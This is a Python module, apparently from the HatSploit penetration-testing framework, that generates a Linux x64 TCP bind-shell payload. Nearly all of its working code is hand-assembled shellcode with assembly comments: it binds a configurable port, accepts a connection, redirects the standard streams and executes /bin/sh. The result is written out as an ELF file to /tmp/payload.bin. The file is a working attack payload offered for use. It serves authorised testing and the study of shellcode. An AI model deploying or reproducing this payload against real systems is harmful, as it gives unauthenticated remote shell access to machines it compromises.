#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import HatSploitModule

from utils.payload.payload import payload

class HatSploitModule(HatSploitModule):
    payload = payload()

    details = {
        'Name': "Linux x64 Shell Bind TCP",
        'Module': "payload/linux/x64/shell_bind_tcp",
        'Authors': [
            'enty8080'
        ],
        'Description': "Shell Bind TCP Payload for Linux x64.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Risk': "low"
    }

    options = {
        'BPORT': {
            'Description': "Bind port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'FORMAT': {
            'Description': "Output format.",
            'Value': "elf",
            'Type': None,
            'Required': True
        },
        'LPATH': {
            'Description': "Local path.",
            'Value': "/tmp/payload.bin",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        bind_port, file_format, local_file = self.parser.parse_options(self.options)
        bind_port = self.payload.port_to_bytes(bind_port)

        if not file_format in self.payload.formats.keys():
            self.badges.output_error("Invalid format!")
            return

        self.badges.output_process("Generating shellcode...")
        shellcode = (
            b"\x6a\x29" +                      # pushq  $0x29
            b"\x58" +                          # pop    %rax
            b"\x99" +                          # cltd
            b"\x6a\x02" +                      # pushq  $0x2
            b"\x5f" +                          # pop    %rdi
            b"\x6a\x01" +                      # pushq  $0x1
            b"\x5e" +                          # pop    %rsi
            b"\x0f\x05" +                      # syscall
            b"\x48\x97" +                      # xchg   %rax,%rdi
            b"\x52" +                          # push   %rdx
            b"\xc7\x04\x24\x02\x00" +          # movl   $0xb3150002,(%rsp)
            bind_port +                        # port
            b"\x48\x89\xe6" +                  # mov    %rsp,%rsi
            b"\x6a\x10" +                      # pushq  $0x10
            b"\x5a" +                          # pop    %rdx
            b"\x6a\x31" +                      # pushq  $0x31
            b"\x58" +                          # pop    %rax
            b"\x0f\x05" +                      # syscall
            b"\x6a\x32" +                      # pushq  $0x32
            b"\x58" +                          # pop    %rax
            b"\x0f\x05" +                      # syscall
            b"\x48\x31\xf6" +                  # xor    %rsi,%rsi
            b"\x6a\x2b" +                      # pushq  $0x2b
            b"\x58" +                          # pop    %rax
            b"\x0f\x05" +                      # syscall
            b"\x48\x97" +                      # xchg   %rax,%rdi
            b"\x6a\x03" +                      # pushq  $0x3
            b"\x5e" +                          # pop    %rsi
            b"\x48\xff\xce" +                  # dec    %rsi
            b"\x6a\x21" +                      # pushq  $0x21
            b"\x58" +                          # pop    %rax
            b"\x0f\x05" +                      # syscall
            b"\x75\xf6" +                      # jne    33 <dup2_loop>
            b"\x6a\x3b" +                      # pushq  $0x3b
            b"\x58" +                          # pop    %rax
            b"\x99" +                          # cltd
            b"\x48\xbb\x2f\x62\x69\x6e\x2f" +  # movabs $0x68732f6e69622f,%rbx
            b"\x73\x68\x00" +                  #
            b"\x53" +                          # push   %rbx
            b"\x48\x89\xe7" +                  # mov    %rsp,%rdi
            b"\x52" +                          # push   %rdx
            b"\x57" +                          # push   %rdi
            b"\x48\x89\xe6" +                  # mov    %rsp,%rsi
            b"\x0f\x05"                        # syscall
        )

        self.badges.output_process("Generating payload...")
        payload = self.payload.generate(file_format, 'x64', shellcode)

        self.badges.output_process("Saving to " + local_file + "...")
        with open(local_file, 'wb') as f:
            f.write(payload)
        self.badges.output_success("Successfully saved to " + local_file + "!")